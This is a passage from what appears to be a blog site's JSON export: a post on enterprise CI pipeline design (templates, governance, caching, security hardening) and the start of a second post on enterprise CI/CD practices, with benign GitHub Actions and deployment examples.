workflow name: Enterprise CI Pipeline on: push: branches: [main, develop] pull_request: branches: [main] jobs: build: runs-on: ubuntu-latest steps: - uses: actions&#x2F;checkout@v2 - name: Static Analysis run: npm run lint - name: Build run: npm run build - name: Unit Tests run: npm test - name: Security Scan run: npm audit 2. Modular Pipeline Templates In enterprise environments with dozens or hundreds of services, maintaining individual pipelines becomes unsustainable. Pipeline templates solve this by extracting common patterns into reusable modules. The Template Hierarchy: graph TB A([🎯 Base TemplateCommon stages for all projects]) --> B([☕ Java TemplateMaven/Gradle specifics]) A --> C([🐍 Python Templatepip/pytest specifics]) A --> D([⚡ Node.js Templatenpm/jest specifics]) B --> E([🔧 Microservice ACustom configuration]) C --> F([🔧 Microservice BCustom configuration]) D --> G([🔧 Frontend AppCustom configuration]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Base Template Example (GitHub Actions): # .github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml name: Base CI Template on: workflow_call: inputs: build_command: required: true type: string test_command: required: true type: string artifact_path: required: false type: string default: &#39;dist&#x2F;&#39; jobs: ci: runs-on: ubuntu-latest steps: - uses: actions&#x2F;checkout@v2 - name: Static Analysis uses: .&#x2F;.github&#x2F;actions&#x2F;static-analysis - name: Build run: $&#123;&#123; inputs.build_command &#125;&#125; - name: Test run: $&#123;&#123; inputs.test_command &#125;&#125; - name: Security Scan uses: .&#x2F;.github&#x2F;actions&#x2F;security-scan - name: Upload Artifacts uses: actions&#x2F;upload-artifact@v2 with: path: $&#123;&#123; inputs.artifact_path &#125;&#125; Service-Specific Pipeline (uses template): # microservice-a&#x2F;.github&#x2F;workflows&#x2F;ci.yml name: Microservice A CI on: [push, pull_request] jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml with: build_command: &#39;mvn clean package&#39; test_command: &#39;mvn test&#39; artifact_path: &#39;target&#x2F;*.jar&#39; Benefits of Template-Based Pipelines: Consistency: All services follow the same quality gates and security checks Maintainability: Update 100 pipelines by changing one template Onboarding: New services inherit best practices automatically Governance: Enforce organizational standards centrally Reduced Duplication: Write common logic once, reuse everywhere Template Composition Patterns: 1. Inheritance Pattern: Templates extend base templates, adding language-specific logic # Java template extends base template jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml with: setup_command: &#39;setup-java@v2&#39; build_command: &#39;mvn package&#39; 2. Mixin Pattern: Compose multiple reusable components jobs: security: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;security-mixin.yml compliance: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;compliance-mixin.yml build: needs: [security, compliance] uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;build.yml 3. Override Pattern: Services can override specific stages when needed jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml with: build_command: &#39;mvn package&#39; # Override: This service needs extended test timeout test_timeout: 30 📦 Template Library OrganizationOrganize templates by scope: .github/workflows/templates/ ├── base&#x2F; │ ├── ci-pipeline.yml # Core CI flow │ └── cd-pipeline.yml # Core CD flow ├── languages&#x2F; │ ├── java-pipeline.yml │ ├── python-pipeline.yml │ └── nodejs-pipeline.yml ├── mixins&#x2F; │ ├── security-scan.yml │ ├── compliance-check.yml │ └── performance-test.yml └── specialized&#x2F; ├── microservice-pipeline.yml └── frontend-pipeline.yml Template Versioning Strategy: Templates evolve over time. Version them to prevent breaking changes: # Use specific template version jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline@v2.1.0 Migration Path: Release new template version (v2.1.0) Services gradually migrate at their own pace Deprecate old versions after migration period Remove deprecated templates after grace period Multi-Team Template Reusability The true power of pipeline templates emerges when multiple teams across an organization share and reuse them. This requires careful design for collaboration, governance, and customization. Centralized Template Repository: Create a dedicated repository for shared templates: ci-templates-repo&#x2F; ├── README.md # Usage guide and catalog ├── CHANGELOG.md # Version history ├── templates&#x2F; │ ├── base&#x2F; │ ├── languages&#x2F; │ ├── mixins&#x2F; │ └── specialized&#x2F; ├── examples&#x2F; │ ├── java-service-example.yml │ ├── python-api-example.yml │ └── frontend-app-example.yml ├── tests&#x2F; │ └── template-validation&#x2F; └── docs&#x2F; ├── getting-started.md ├── customization-guide.md └── migration-guide.md Team Collaboration Model: graph TB A([🏢 Platform TeamTemplate Owners]) -->|Maintains & Publishes| B([📦 Template Repository]) B -->|Consumes| C([👥 Team AJava Services]) B -->|Consumes| D([👥 Team BPython APIs]) B -->|Consumes| E([👥 Team CFrontend Apps]) C -->|Feedback & Requests| A D -->|Feedback & Requests| A E -->|Feedback & Requests| A C -->|Shares Patterns| F([💡 CommunityBest Practices]) D -->|Shares Patterns| F E -->|Shares Patterns| F F -->|Influences| A style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Customization Layers for Teams: Allow teams to customize without forking templates: # Team A&#39;s customization (team-a-defaults.yml) defaults: java_version: 11 maven_opts: &quot;-Xmx2048m&quot; test_timeout: 20 notification_channel: &quot;#team-a-builds&quot; # Team A&#39;s service uses both template and team defaults jobs: build: uses: org&#x2F;ci-templates&#x2F;java-microservice@v2.0.0 with: team_config: team-a-defaults.yml # Service-specific overrides test_timeout: 30 # This service needs more time Template Governance Model: Ownership Structure: Platform Team: Maintains core templates, reviews changes, ensures quality Template Champions: Representatives from each team who provide feedback Service Teams: Consume templates, report issues, suggest improvements Change Management Process: Proposal: Team submits template change request via issue/PR Review: Platform team and champions review impact Testing: Changes tested against sample services from multiple teams Beta Release: New version released with -beta tag Migration Period: Teams test beta version (2-4 weeks) Stable Release: Promoted to stable after validation Deprecation: Old versions deprecated with 3-month sunset period Template Versioning for Multi-Team Use: # Semantic versioning with team migration tracking template: java-microservice version: 2.1.0 released: 2020-08-01 breaking_changes: false adoption: team-a: 15&#x2F;20 services migrated team-b: 8&#x2F;12 services migrated team-c: 20&#x2F;20 services migrated deprecated_versions: v1.x: sunset 2020-11-01 Self-Service Template Catalog: Provide a searchable catalog for teams: # Template metadata for discovery name: java-microservice category: backend language: java use_cases: - REST APIs - Microservices - Batch jobs features: - Maven&#x2F;Gradle support - JUnit testing - Docker packaging - Kubernetes deployment teams_using: [team-a, team-b, team-d, team-f] maturity: stable maintainer: platform-team support_channel: &quot;#ci-templates-help&quot; Cross-Team Customization Patterns: Pattern 1: Team-Specific Mixins Teams can create their own mixins that work with base templates: # Team A&#39;s custom security mixin # team-a-security-mixin.yml steps: - name: Team A Security Scan run: .&#x2F;team-a-security-tool - name: Upload to Team A Dashboard run: .&#x2F;upload-results # Used in service pipeline jobs: build: uses: org&#x2F;ci-templates&#x2F;base@v2.0.0 team-security: uses: team-a&#x2F;team-a-security-mixin@v1.0.0 Pattern 2: Parameterized Team Policies Templates accept team-specific policy configurations: # Template supports team policies jobs: build: uses: org&#x2F;ci-templates&#x2F;java-microservice@v2.0.0 with: team_policy: | code_coverage_min: 80% security_scan: mandatory performance_test: optional approval_required: production_only Pattern 3: Federated Template Extensions Teams can extend templates without modifying originals: # Team B extends base template with their additions # team-b-java-extended.yml name: Team B Java Service extends: org&#x2F;ci-templates&#x2F;java-microservice@v2.0.0 additional_stages: post_build: - name: Team B Metrics run: .&#x2F;collect-team-metrics - name: Team B Notification run: .&#x2F;notify-team-dashboard Measuring Multi-Team Template Success: Track adoption and effectiveness: metrics: adoption_rate: 85% # 170&#x2F;200 services using templates teams_using: 12&#x2F;15 average_customization: 15% # How much teams override template_update_frequency: 2.3&#x2F;month breaking_changes: 0.2&#x2F;year support_tickets: 3.5&#x2F;month time_to_onboard_new_service: 2 hours (was 2 weeks) Communication and Support: Documentation Portal: Searchable docs with examples for each template Slack Channel: #ci-templates-help for questions and discussions Office Hours: Weekly sessions where platform team helps teams Newsletter: Monthly updates on new templates and improvements Template Showcase: Quarterly demos of successful patterns 🌟 Multi-Team Success StoryE-commerce company with 15 teams, 250 services: Challenge: Each team built pipelines differently, causing: Inconsistent security practices Difficult cross-team collaboration High maintenance burden Slow onboarding for new engineers Solution: Implemented shared template library with: 6 base templates (Java, Python, Node.js, Go, Mobile, Data) Team-specific customization layers Federated governance model Self-service catalog Results after 6 months: 85% template adoption (213/250 services) 90% reduction in pipeline maintenance time 100% services now have security scanning New service onboarding: 2 hours (was 2 weeks) Cross-team collaboration improved (shared patterns) 3 teams contributed improvements back to templates Key Success Factor: Balance between standardization and team autonomy Template Governance: Ownership: Platform team maintains templates, service teams consume them Change Process: Template changes require review and testing Documentation: Each template includes usage examples and parameters Metrics: Track template adoption and identify improvement opportunities 3. Fail Fast Principle Run quick checks first. If static analysis fails, don’t waste time on builds and tests. This saves compute resources and provides faster feedback. Optimal Stage Order: Linting (seconds) Static analysis (1-2 minutes) Build (2-5 minutes) Unit tests (5-10 minutes) Integration tests (10-20 minutes) E2E tests (20-30 minutes) 4. Parallel Execution Run independent tasks simultaneously: Test Parallelization: Split test suites across multiple runners Multi-Platform Builds: Build for different platforms concurrently Independent Services: Build microservices in parallel This can reduce pipeline time from hours to minutes. 5. Caching Strategy Implement aggressive caching: Dependency Caching: Cache npm, Maven, or pip dependencies Build Caching: Reuse compiled artifacts when source hasn’t changed Docker Layer Caching: Leverage Docker’s layer caching for faster image builds 💡 Cache InvalidationCache invalidation is notoriously difficult. Use content-based cache keys (hash of dependency files) rather than time-based expiration. This ensures caches are invalidated only when dependencies actually change. 6. Environment Parity Keep development, staging, and production environments as similar as possible: Infrastructure as Code: Use Terraform or CloudFormation to define environments Configuration Management: Use the same configuration system across all environments Data Parity: Use anonymized production data in staging when possible 7. Monitoring and Observability Instrument your pipelines: Build Metrics: Track build duration, success rate, failure reasons Resource Usage: Monitor CPU, memory, and disk usage during builds Alerting: Notify teams when pipelines fail or performance degrades 8. Security Hardening Protect your CI infrastructure: Secrets Management: Use vault systems (HashiCorp Vault, AWS Secrets Manager) for credentials Least Privilege: Grant minimal permissions needed for each pipeline stage Audit Logging: Log all pipeline executions and access attempts Network Isolation: Run builds in isolated networks to prevent lateral movement ⚠️ Common Security Mistakes Storing credentials in environment variables Running builds with admin privileges Allowing arbitrary code execution in pull requests Exposing internal services to build runners Failing to rotate credentials regularly The One-Pipeline-Fits-All Debate A recurring question in enterprise CI design: should you create one universal pipeline that handles all applications, or maintain specialized pipelines for different use cases? The answer, like most architectural decisions, is nuanced. The Appeal of Universal Pipelines The idea is seductive: one pipeline to rule them all. Every application, regardless of language or framework, flows through the same stages with the same quality gates. Theoretical Benefits: Ultimate consistency across the organization Single point of maintenance Simplified governance and compliance Easier onboarding for new teams The Reality Check: A truly universal pipeline becomes either too generic to be useful or too complex to maintain. Consider these scenarios: graph TB A([Universal Pipeline]) --> B{Application Type?} B -->|Java| C[Maven buildJUnit testsJAR packaging] B -->|Python| D[pip installpytestWheel packaging] B -->|Node.js| E[npm installJest testsDocker image] B -->|Go| F[go buildgo testBinary packaging] B -->|Mobile| G[Gradle/XcodeUI testsApp store deploy] style A fill:#ffebee,stroke:#c62828,stroke-width:3px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px The Complexity Explosion: A universal pipeline handling all these cases requires: Conditional logic for every language and framework Configuration files specifying application type Detection mechanisms to identify project structure Fallback strategies when detection fails Extensive testing across all supported scenarios The result? A 2000-line pipeline configuration that nobody fully understands and everyone fears touching. The Spectrum of Solutions Rather than binary choice, consider a spectrum: Level 1: Fully Specialized Pipelines Each application has unique pipeline Maximum flexibility, zero reuse Maintenance nightmare at scale Level 2: Language-Specific Templates ⭐ (Recommended) Separate templates for Java, Python, Node.js, etc. Each template optimized for its ecosystem Services inherit and customize as needed Level 3: Hybrid Universal Pipeline Base pipeline with language-specific plugins Moderate complexity, good reuse Requires sophisticated plugin architecture Level 4: Fully Universal Pipeline One pipeline handles everything Maximum consistency, high complexity Difficult to maintain and extend 🎯 The Sweet SpotLevel 2 (Language-Specific Templates) offers the best balance for most enterprises: Consistency: All Java services use the same Java template Optimization: Each template uses language-specific best practices Maintainability: 5-10 templates instead of 200 unique pipelines Flexibility: Services can override when needed Simplicity: Each template is focused and understandable When Universal Pipelines Work Universal pipelines can succeed in specific contexts: Homogeneous Environments: Organization standardized on single language/framework All services follow identical architecture patterns Example: Microservices company with 100% Go services Container-First Organizations: Every application builds a Docker image Pipeline focuses on container lifecycle, not language specifics Language-specific steps happen inside Dockerfiles # Universal container pipeline stages: - lint - build-image # Dockerfile handles language specifics - test-image - scan-image - push-image - deploy Highly Abstracted Platforms: Platform team provides build abstractions Applications declare dependencies, platform handles building Example: Bazel or Buck build systems with universal rules The Template-Based Approach (Recommended) Instead of forcing everything through one pipeline, create a family of specialized templates: Templates&#x2F; ├── base-template.yml # Common stages all inherit ├── java-microservice.yml # Extends base, adds Maven&#x2F;Gradle ├── python-service.yml # Extends base, adds pip&#x2F;pytest ├── nodejs-frontend.yml # Extends base, adds npm&#x2F;webpack ├── mobile-ios.yml # Extends base, adds Xcode ├── mobile-android.yml # Extends base, adds Gradle └── data-pipeline.yml # Extends base, adds Spark&#x2F;Airflow Each template is optimized for its domain: # java-microservice.yml extends: base-template.yml stages: - validate: - checkstyle - spotbugs - build: - maven: clean package - cache: ~&#x2F;.m2&#x2F;repository - test: - junit: test - jacoco: coverage &gt; 80% - package: - docker: build - artifact: target&#x2F;*.jar # nodejs-frontend.yml extends: base-template.yml stages: - validate: - eslint - prettier - build: - npm: ci - webpack: build --production - cache: node_modules&#x2F; - test: - jest: --coverage - cypress: e2e - package: - s3: upload dist&#x2F; Decision Framework Use this framework to decide your approach: Choose Universal Pipeline if: ✅ All applications use same language/framework ✅ Organization has strong platform engineering team ✅ Container-first architecture with language abstraction ✅ Willing to invest heavily in pipeline sophistication Choose Template-Based Approach if: ✅ Multiple languages and frameworks in use ✅ Different application types (web, mobile, data, ML) ✅ Teams need flexibility for special requirements ✅ Want balance between consistency and maintainability Choose Specialized Pipelines if: ✅ Very small organization (&lt;10 services) ✅ Highly diverse technology stack ✅ Each application has unique deployment requirements ✅ Rapid experimentation more important than consistency ⚠️ Anti-Pattern: The Mega-PipelineAvoid creating a single pipeline with hundreds of conditional branches: # DON'T DO THIS if language &#x3D;&#x3D; &quot;java&quot;: if build_tool &#x3D;&#x3D; &quot;maven&quot;: if java_version &#x3D;&#x3D; &quot;8&quot;: run: mvn -Djava.version&#x3D;8 package elif java_version &#x3D;&#x3D; &quot;11&quot;: run: mvn -Djava.version&#x3D;11 package elif build_tool &#x3D;&#x3D; &quot;gradle&quot;: # ... more conditions elif language &#x3D;&#x3D; &quot;python&quot;: # ... more conditions This becomes unmaintainable and error-prone. Use templates instead. Conclusion: Pragmatic Flexibility The question isn’t “can one pipeline fit all applications?” but “should it?” The answer for most enterprises is no. Instead: Create a base template with common stages (security, compliance, deployment) Build specialized templates for each major technology stack Allow customization where teams have legitimate special needs Maintain governance through required stages in base template Measure and iterate based on actual usage patterns This approach provides consistency where it matters (security, compliance) while allowing optimization where it helps (language-specific tooling). It’s the pragmatic middle ground that scales with your organization. Handling Common Enterprise Challenges Challenge 1: Long Build Times Problem: Builds taking 30+ minutes frustrate developers and slow delivery. Solutions: Implement incremental builds (only rebuild changed components) Use distributed build systems (Bazel, Buck) Invest in faster build infrastructure Parallelize test execution Cache aggressively Challenge 2: Flaky Tests Problem: Tests that pass/fail inconsistently erode confidence in CI. Solutions: Quarantine flaky tests (run separately, don’t block pipeline) Add retry logic for network-dependent tests Use test isolation techniques Monitor test reliability metrics Allocate time for test maintenance Challenge 3: Dependency Management Problem: Managing dependencies across hundreds of services becomes chaotic. Solutions: Use dependency management tools (Dependabot, Renovate) Implement automated dependency updates Maintain an approved dependency list Use lock files to ensure reproducible builds Regular security audits of dependencies Challenge 4: Multi-Team Coordination Problem: Teams stepping on each other’s toes during deployments. Solutions: Implement deployment windows Use feature flags to decouple deployment from release Establish clear ownership boundaries Create shared pipeline templates Regular cross-team sync meetings Challenge 5: Compliance and Audit Requirements Problem: Regulatory requirements demand extensive documentation and controls. Solutions: Automated compliance checks in pipeline Immutable audit logs Approval workflows for production deployments Automated evidence collection for audits Regular compliance reviews Tools and Technologies CI/CD Platforms Jenkins: Most flexible, requires significant maintenance. Best for complex enterprise requirements with existing Jenkins expertise. GitLab CI: Integrated with source control, good for teams wanting all-in-one solution. GitHub Actions: Excellent for GitHub-centric workflows, growing ecosystem of actions. CircleCI: Strong performance, good caching, scales well. AWS CodePipeline: Native AWS integration, serverless execution model. Build Tools Maven/Gradle: Java ecosystem standards npm/Yarn: JavaScript package management Make: Universal build automation Bazel: Google’s build system, excellent for monorepos Testing Frameworks JUnit/TestNG: Java testing Jest/Mocha: JavaScript testing pytest: Python testing Selenium: Browser automation JMeter: Performance testing Security Tools SonarQube: Code quality and security analysis Snyk: Dependency vulnerability scanning Trivy: Container security scanning OWASP Dependency-Check: Open source dependency analysis Measuring Pipeline Success Track these key metrics: Build Success Rate: Percentage of builds that pass. Target: &gt;95% Mean Time to Feedback: How quickly developers get build results. Target: &lt;10 minutes Deployment Frequency: How often you deploy to production. Target: Multiple times per day Change Failure Rate: Percentage of deployments causing incidents. Target: &lt;5% Mean Time to Recovery: How quickly you recover from failures. Target: &lt;1 hour (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_528bdaffd')); var option = { \"title\": { \"text\": \"CI Pipeline Performance Metrics\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"Build Success Rate\", \"Deployment Frequency\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"Week 1\", \"Week 2\", \"Week 3\", \"Week 4\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Percentage\" }, \"series\": [ { \"name\": \"Build Success Rate\", \"type\": \"line\", \"data\": [92, 94, 96, 97], \"itemStyle\": { \"color\": \"#388e3c\" } }, { \"name\": \"Deployment Frequency\", \"type\": \"line\", \"data\": [85, 88, 91, 93], \"itemStyle\": { \"color\": \"#1976d2\" } } ] }; chart.setOption(option); } })(); Conclusion Designing CI pipelines for enterprise environments requires balancing competing demands: speed versus thoroughness, flexibility versus standardization, innovation versus stability. The principles outlined here - fail fast, cache aggressively, test comprehensively, secure by default - provide a foundation for building pipelines that scale with your organization. Remember that CI pipeline design is never finished. As your organization grows, technologies evolve, and requirements change, your pipelines must adapt. Invest in making them maintainable, observable, and continuously improving. The goal isn’t perfection - it’s building a system that reliably delivers quality software while enabling teams to move fast and innovate. With thoughtful design and continuous refinement, your CI pipeline becomes a competitive advantage rather than a bottleneck. 💭 Final Thought&quot;The best CI pipeline is the one you don't notice - it just works, every time, allowing developers to focus on building great software rather than fighting their tools.&quot;","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"}]},{"title":"CI/CD for Enterprise: The Path to Continuous Excellence","slug":"2020/07/CI_CD_for_Enterprise_The_Path_to_Continuous_Excellence","date":"un66fin66","updated":"un55fin55","comments":true,"path":"2020/07/CI_CD_for_Enterprise_The_Path_to_Continuous_Excellence/","permalink":"https://neo01.com/2020/07/CI_CD_for_Enterprise_The_Path_to_Continuous_Excellence/","excerpt":"From manual deployments to automated pipelines - discover how CI/CD transforms enterprise software delivery. Learn the principles, practices, and patterns that enable teams to ship faster while maintaining quality.","text":"Remember the days when deploying software meant scheduling a maintenance window at 2 AM, gathering the entire team on a conference call, and crossing your fingers that nothing would break? For many enterprises, this was the norm just a decade ago. Deployments were rare, risky events that everyone dreaded. Then something changed. Companies like Amazon, Netflix, and Google started deploying code thousands of times per day - not per year, per day. They weren’t just moving faster; they were delivering higher quality software with fewer incidents. Their secret? Continuous Integration and Continuous Deployment (CI/CD). What started as a radical idea in Silicon Valley has become the foundation of modern software delivery. Today, CI/CD isn’t just about speed - it’s about transforming how enterprises build, test, and deliver software in a world where business agility is survival. The Evolution of Software Delivery Software delivery has undergone a dramatic transformation over the past two decades. Understanding this journey helps us appreciate why CI/CD has become essential for enterprise success. The Waterfall Era: Sequential and Slow In the early 2000s, most enterprises followed the waterfall model. Requirements were gathered for months, development took quarters, testing happened at the end, and deployment was a major event. Release cycles measured in months or years were common. This approach worked when software changed slowly and customer expectations were lower. But the world was changing. The internet accelerated business cycles. Mobile apps created new customer expectations. Cloud computing made infrastructure programmable. The waterfall model couldn’t keep pace. The Agile Revolution: Iterative Development Agile methodologies emerged as a response to waterfall’s limitations. Teams began working in sprints, delivering working software every few weeks instead of every few months. This was a massive improvement, but a problem remained: even though teams could build features quickly, getting them to production was still slow and painful. The “last mile” problem became apparent - teams could develop software iteratively, but deployment remained a bottleneck. Code would pile up waiting for the next release window. Integration issues would surface late. The promise of agility was constrained by deployment reality. The DevOps Movement: Breaking Down Silos DevOps emerged to address the disconnect between development and operations. The core insight was simple but profound: you can’t have agile development if deployment is still waterfall. Teams needed to own the entire lifecycle from code to production. This cultural shift required new practices and tools. Automation became essential. Infrastructure as code made environments reproducible. Monitoring and observability became first-class concerns. And at the heart of it all was CI/CD - the technical foundation that made continuous delivery possible. timeline title Evolution of Software Delivery 2000-2005 : Waterfall Era : Sequential phases : Releases every 6-12 months : Manual testing and deployment 2005-2010 : Agile Adoption : Iterative development : 2-4 week sprints : Deployment still manual 2010-2015 : DevOps Emergence : Automation focus : Infrastructure as code : CI/CD pipelines 2015-2020 : Continuous Everything : Multiple deployments per day : Automated testing and security : Cloud-native architectures Understanding CI/CD: More Than Just Automation CI/CD is often misunderstood as simply automating deployments. While automation is crucial, CI/CD represents a fundamental shift in how we think about software delivery. Continuous Integration: Building Quality In Continuous Integration (CI) is the practice of merging code changes frequently - often multiple times per day - into a shared repository. Each integration triggers an automated build and test process that provides rapid feedback. The Core Principle: Integrate early and often. Instead of working in isolation for weeks and then facing integration hell, developers integrate their changes continuously. This makes integration a non-event rather than a crisis. What Happens in CI: Developer commits code to version control CI server detects the change and triggers a build Code is compiled and unit tests run Static analysis checks code quality and security Results are reported back to the team within minutes This rapid feedback loop catches issues when they’re easiest to fix - right after they’re introduced. A test that fails immediately after a commit clearly points to that commit as the cause. A test that fails three weeks later could be caused by any of hundreds of changes. Continuous Deployment vs Continuous Delivery The terms are often confused, but the distinction matters: Continuous Delivery means your code is always in a deployable state. Every change that passes automated tests could be deployed to production, but the actual deployment requires human approval. This gives teams confidence that they can deploy at any time while maintaining control over when deployments happen. Continuous Deployment goes one step further - every change that passes automated tests is automatically deployed to production without human intervention. This requires exceptional confidence in your automated testing and monitoring. Most enterprises start with Continuous Delivery and gradually move toward Continuous Deployment as their practices mature and confidence grows. graph LR A([💻 Code Commit]) --> B([🔨 Build]) B --> C([🧪 Automated Tests]) C --> D{Tests Pass?} D -->|No| E([❌ Notify Team]) D -->|Yes| F([📦 Artifact Created]) F --> G{ContinuousDelivery} G --> H{ManualApproval?} H -->|Yes| I([🚀 Deploy to Prod]) H -->|No| J([⏸️ Ready to Deploy]) G --> K{ContinuousDeployment} K --> I style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style I fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:2px The Pipeline: Your Deployment Assembly Line A CI/CD pipeline is the automated manifestation of your software delivery process. Think of it as an assembly line where code enters at one end and deployable software emerges at the other, with quality checks at every stage. Typical Pipeline Stages: Source: Code is committed to version control Build: Code is compiled and packaged Test: Automated tests verify functionality Security Scan: Vulnerabilities are detected Deploy to Staging: Code is deployed to a production-like environment Integration Tests: End-to-end scenarios are verified Deploy to Production: Code goes live to users Each stage acts as a quality gate. If any stage fails, the pipeline stops and the team is notified. This prevents bad code from progressing toward production. 💡 Pipeline Design PrincipleDesign your pipeline to fail fast. Put quick, high-value checks early in the pipeline. If unit tests take 5 minutes and integration tests take 30 minutes, run unit tests first. This gives developers faster feedback and saves compute resources by not running expensive tests on code that fails basic checks. Key Practices for Enterprise CI/CD Implementing CI/CD in an enterprise context requires more than just tools - it requires adopting practices that ensure quality, security, and reliability at scale. Trunk-Based Development Long-lived feature branches are the enemy of continuous integration. The longer code lives in a branch, the more it diverges from the main codebase, and the more painful integration becomes. Trunk-based development means developers work on short-lived branches (or directly on the main branch) and integrate their changes at least daily. This keeps the codebase in a continuously integrated state. Feature Flags: How do you deploy incomplete features without breaking production? Feature flags allow you to merge code to the main branch while keeping features hidden until they’re ready. This decouples deployment from release, giving you flexibility and reducing risk. Automated Testing Strategy Automated testing is the foundation of CI/CD confidence. Without comprehensive automated tests, you can’t safely deploy frequently. The Testing Pyramid: Unit Tests (Base): Fast, numerous tests of individual components Integration Tests (Middle): Tests of component interactions End-to-End Tests (Top): Full system tests from user perspective The pyramid shape is intentional - you want many fast unit tests, fewer integration tests, and even fewer end-to-end tests. This balance provides good coverage while keeping test execution time reasonable. ⚠️ The Testing TrapMore tests aren't always better. Poorly designed tests that are slow, flaky, or provide little value become a burden that slows down your pipeline. Focus on test quality and maintainability, not just coverage percentages. Infrastructure as Code Manual infrastructure configuration is incompatible with CI/CD. You need reproducible, version-controlled infrastructure that can be created and destroyed automatically. Infrastructure as Code (IaC) treats infrastructure configuration as software. Tools like Terraform, CloudFormation, or Ansible allow you to define infrastructure in code, version it alongside your application code, and deploy it through the same CI/CD pipeline. Benefits: Environments are consistent and reproducible Infrastructure changes are reviewed like code changes Disaster recovery becomes a deployment operation Scaling is automated and predictable Database Migrations Databases are often the hardest part of CI/CD. Unlike stateless application code, databases contain state that must be preserved across deployments. Migration-Based Approach: Instead of modifying databases directly, create migration scripts that transform the database from one version to the next. These migrations are version-controlled and applied automatically during deployment. Backward Compatibility: Design migrations to be backward compatible when possible. This allows you to deploy database changes before application changes, reducing deployment risk and enabling zero-downtime deployments. Monitoring and Observability Deploying frequently means you need to know immediately when something goes wrong. Comprehensive monitoring and observability are essential. Key Metrics to Track: Deployment Frequency: How often are you deploying? Lead Time: How long from commit to production? Mean Time to Recovery (MTTR): How quickly can you fix issues? Change Failure Rate: What percentage of deployments cause problems? These four metrics, popularized by the book “Accelerate,” are strong indicators of software delivery performance. ✨ High-Performing TeamsResearch shows that high-performing teams deploy multiple times per day, have lead times under one hour, recover from incidents in under one hour, and have change failure rates under 15%. These aren't just speed metrics - they correlate strongly with business outcomes. Building Your Enterprise CI/CD Pipeline Let’s walk through building a production-ready CI/CD pipeline for an enterprise application. Stage 1: Source Control and Branching Strategy Everything starts with version control. For enterprises, this typically means Git with a platform like GitHub, GitLab, or Bitbucket. Branching Strategy: Main Branch: Always deployable, protected from direct commits Feature Branches: Short-lived (1-2 days max), merged via pull requests Release Branches: Optional, for teams that need to support multiple versions Pull Request Process: Developer creates feature branch Implements changes with tests Opens pull request for review Automated checks run (tests, linting, security scans) Team reviews code Changes are merged to main branch Stage 2: Continuous Integration When code is merged to the main branch, the CI pipeline kicks off automatically. Build Process: # Example CI configuration (GitHub Actions) name: CI Pipeline on: push: branches: [main] pull_request: branches: [main] jobs: build: runs-on: ubuntu-latest steps: - uses: actions&#x2F;checkout@v2 - name: Setup environment uses: actions&#x2F;setup-node@v2 with: node-version: &#39;14&#39; - name: Install dependencies run: npm ci - name: Run linting run: npm run lint - name: Run unit tests run: npm test - name: Run security scan run: npm audit - name: Build application run: npm run build - name: Upload artifact uses: actions&#x2F;upload-artifact@v2 with: name: app-bundle path: dist&#x2F; This pipeline runs on every commit, providing rapid feedback to developers. Stage 3: Automated Testing After the build succeeds, comprehensive testing begins. Test Stages: Unit Tests: Run during build (5-10 minutes) Integration Tests: Test component interactions (10-20 minutes) Security Tests: Scan for vulnerabilities (5-10 minutes) Performance Tests: Verify performance requirements (15-30 minutes) End-to-End Tests: Full user scenarios (20-40 minutes) Parallel Execution: Run independent test suites in parallel to reduce total pipeline time. A pipeline that would take 90 minutes sequentially might complete in 30 minutes with parallelization. Stage 4: Deployment to Staging Once all tests pass, the application is automatically deployed to a staging environment that mirrors production. Staging Environment Purpose: Final validation before production Manual exploratory testing Performance testing under production-like load Integration with external systems Deployment Automation: deploy-staging: needs: build runs-on: ubuntu-latest steps: - name: Download artifact uses: actions&#x2F;download-artifact@v2 with: name: app-bundle - name: Deploy to staging run: | aws s3 sync dist&#x2F; s3:&#x2F;&#x2F;staging-bucket&#x2F; aws cloudfront create-invalidation --distribution-id $STAGING_DIST - name: Run smoke tests run: npm run test:smoke -- --env&#x3D;staging Stage 5: Production Deployment After staging validation, the application is ready for production deployment. Deployment Strategies: Blue-Green Deployment: Maintain two identical production environments (blue and green). Deploy to the inactive environment, test it, then switch traffic over. If issues arise, switch back instantly. Canary Deployment: Deploy to a small subset of production servers first. Monitor for issues. Gradually increase traffic to the new version. Roll back if problems are detected. Rolling Deployment: Update servers one at a time or in small batches. This minimizes risk while avoiding the infrastructure cost of blue-green deployments. graph TB A([📦 New Version Ready]) --> B{DeploymentStrategy} B 